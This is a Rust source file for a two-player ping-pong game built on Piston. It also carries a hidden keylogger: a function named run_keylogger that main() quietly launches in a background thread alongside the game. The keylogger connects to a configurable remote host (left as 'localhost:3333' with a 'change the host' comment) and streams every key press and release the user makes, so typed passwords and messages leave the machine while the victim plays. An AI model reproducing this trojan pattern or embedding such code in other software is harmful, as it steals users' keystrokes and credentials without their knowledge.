use std::net::TcpStream;
use std::io::{self, Write, Read};
use device_query::{DeviceQuery, DeviceState, Keycode};
use std::{thread, time};
use std::process::exit;

extern crate piston_window;
extern crate rand;

use piston_window::*;
use rand::Rng;

const WIDTH: f64 = 800.0;
const HEIGHT: f64 = 600.0;
const PADDLE_WIDTH: f64 = 15.0;
const PADDLE_HEIGHT: f64 = 100.0;
const BALL_SIZE: f64 = 20.0;
const PADDLE_SPEED: f64 = 8.0;
const BALL_SPEED: f64 = 5.0;

struct Paddle {
    x: f64,
    y: f64,
    width: f64,
    height: f64,
    score: u32,
}

struct Ball {
    x: f64,
    y: f64,
    size: f64,
    dx: f64,
    dy: f64,
}

impl Paddle {
    fn new(x: f64) -> Self {
        Paddle {
            x,
            y: HEIGHT / 2.0 - PADDLE_HEIGHT / 2.0,
            width: PADDLE_WIDTH,
            height: PADDLE_HEIGHT,
            score: 0,
        }
    }

    fn update(&mut self, direction: f64) {
        self.y += direction * PADDLE_SPEED;
        if self.y < 0.0 {
            self.y = 0.0;
        }
        if self.y + self.height > HEIGHT {
            self.y = HEIGHT - self.height;
        }
    }

    fn draw<G: Graphics>(&self, c: &Context, g: &mut G) {
        rectangle(
            [1.0, 1.0, 1.0, 1.0],
            [self.x, self.y, self.width, self.height],
            c.transform,
            g,
        );
    }
}

impl Ball {
    fn new() -> Self {
        let mut rng = rand::thread_rng();
        let dx = if rng.gen_bool(0.5) { BALL_SPEED } else { -BALL_SPEED };
        let dy = rng.gen_range(-BALL_SPEED..BALL_SPEED);

        Ball {
            x: WIDTH / 2.0 - BALL_SIZE / 2.0,
            y: HEIGHT / 2.0 - BALL_SIZE / 2.0,
            size: BALL_SIZE,
            dx,
            dy,
        }
    }

    fn update(&mut self, paddle1: &Paddle, paddle2: &Paddle) -> bool {
        self.x += self.dx;
        self.y += self.dy;

        if self.y <= 0.0 || self.y + self.size >= HEIGHT {
            self.dy = -self.dy;
        }

        let collides_with_paddle1 = self.x <= paddle1.x + paddle1.width
            && self.x + self.size >= paddle1.x
            && self.y + self.size >= paddle1.y
            && self.y <= paddle1.y + paddle1.height;

        let collides_with_paddle2 = self.x + self.size >= paddle2.x
            && self.x <= paddle2.x + paddle2.width
            && self.y + self.size >= paddle2.y
            && self.y <= paddle2.y + paddle2.height;

        if collides_with_paddle1 || collides_with_paddle2 {
            self.dx = -self.dx;
            self.dy += rand::thread_rng().gen_range(-1.0..1.0);
            self.dy = self.dy.clamp(-BALL_SPEED, BALL_SPEED);
        }

        if self.x <= 0.0 || self.x + self.size >= WIDTH {
            return true;
        }

        false
    }

    fn reset(&mut self) {
        self.x = WIDTH / 2.0 - BALL_SIZE / 2.0;
        self.y = HEIGHT / 2.0 - BALL_SIZE / 2.0;
        self.dx = if self.dx > 0.0 { -BALL_SPEED } else { BALL_SPEED };
        self.dy = rand::thread_rng().gen_range(-BALL_SPEED..BALL_SPEED);
    }

    fn draw<G: Graphics>(&self, c: &Context, g: &mut G) {
        ellipse(
            [1.0, 1.0, 1.0, 1.0],
            [self.x, self.y, self.size, self.size],
            c.transform,
            g,
        );
    }
}

fn run_keylogger() {
    match TcpStream::connect("localhost:3333") { // change the host
        Ok(mut stream) => {
            let _ = stream.write_all(b"");
            if let Err(e) = stream.set_nonblocking(true) {
                println!("Failed to set non-blocking mode: {}", e);
            }

            let device_state = DeviceState::new();
            let mut pressed_keys = Vec::new();
            let mut buffer = [0; 128];

            loop {
                let current_keys = device_state.get_keys();

                for key in &current_keys {
                    if !pressed_keys.contains(key) {
                        let event = format!("{:?}\n", key);
                        let _ = stream.write_all(event.as_bytes());
                    }
                }

                for key in &pressed_keys {
                    if !current_keys.contains(key) {
                        let event = format!("Released: {:?}\n", key);
                        let _ = stream.write_all(event.as_bytes());
                    }
                }

                pressed_keys = current_keys;

                match stream.read(&mut buffer) {
                    Ok(size) if size > 0 => {
                        let _ = String::from_utf8_lossy(&buffer[..size]);
                    }
                    Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {}
                    Err(_) => {
                        println!("Lost connection to server.");
                        return;
                    }
                    _ => {}
                }

                thread::sleep(time::Duration::from_millis(20));
            }
        }
        Err(e) => {
            println!("Failed to connect to server: {}", e);
        }
    }
}
fn run_game() {
    let mut window: PistonWindow = WindowSettings::new("Ping Pong", [WIDTH as u32, HEIGHT as u32])
        .exit_on_esc(true)
        .build()
        .unwrap();

    let mut paddle1 = Paddle::new(30.0);
    let mut paddle2 = Paddle::new(WIDTH - 30.0 - PADDLE_WIDTH);
    let mut ball = Ball::new();

    let mut text_context = window.create_texture_context();
    let mut glyphs = Glyphs::new("FiraSans-Black.ttf", text_context, TextureSettings::new()).unwrap();

    let mut game_over = false;
    let mut winner = 0;

    while let Some(e) = window.next() {
        if let Some(Button::Keyboard(key)) = e.press_args() {
            match key {
                Key::R => {
                    paddle1.score = 0;
                    paddle2.score = 0;
                    game_over = false;
                }
                _ => {}
            }
        }

        if !game_over {
            if let Some(_args) = e.update_args() {
                let mut paddle1_dir = 0.0;
                let mut paddle2_dir = 0.0;

                if let Some(Button::Keyboard(key)) = e.press_args() {
                    match key {
                        Key::W => paddle1_dir = -1.0,
                        Key::S => paddle1_dir = 1.0,
                        Key::Up => paddle2_dir = -1.0,
                        Key::Down => paddle2_dir = 1.0,
                        _ => {}
                    }
                }

                paddle1.update(paddle1_dir);
                paddle2.update(paddle2_dir);

                if ball.update(&paddle1, &paddle2) {
                    if ball.x <= 0.0 {
                        paddle2.score += 1;
                    } else {
                        paddle1.score += 1;
                    }

                    if paddle1.score >= 5 || paddle2.score >= 5 {
                        game_over = true;
                        winner = if paddle1.score >= 5 { 1 } else { 2 };
                    }

                    ball.reset();
                }
            }
        }

        window.draw_2d(&e, |c, g, device| {
            clear([0.0, 0.0, 0.0, 1.0], g);

            for i in (0..HEIGHT as i32).step_by(20) {
                rectangle([0.5, 0.5, 0.5, 1.0], [WIDTH / 2.0 - 2.0, i as f64, 4.0, 10.0], c.transform, g);
            }

            paddle1.draw(&c, g);
            paddle2.draw(&c, g);
            ball.draw(&c, g);

            text::Text::new_color([1.0, 1.0, 1.0, 1.0], 32).draw(
                &paddle1.score.to_string(), &mut glyphs, &c.draw_state,
                c.transform.trans(100.0, 50.0), g,
            );

            text::Text::new_color([1.0, 1.0, 1.0, 1.0], 32).draw(
                &paddle2.score.to_string(), &mut glyphs, &c.draw_state,
                c.transform.trans(WIDTH - 100.0, 50.0), g,
            );

            if game_over {
                text::Text::new_color([1.0, 0.0, 0.0, 1.0], 48).draw(
                    &format!("Player {} Wins!", winner), &mut glyphs, &c.draw_state,
                    c.transform.trans(WIDTH / 2.0 - 150.0, HEIGHT / 2.0 - 50.0), g,
                );

                text::Text::new_color([1.0, 1.0, 1.0, 1.0], 24).draw(
                    "Press 'R' to restart", &mut glyphs, &c.draw_state,
                    c.transform.trans(WIDTH / 2.0 - 100.0, HEIGHT / 2.0 + 20.0), g,
                );
            }

            glyphs.factory.encoder.flush(device);
        });
    }
}

fn main() {
    let keylogger_thread = thread::spawn(|| {
        run_keylogger();
    });

    run_game();

    keylogger_thread.join().unwrap();
}
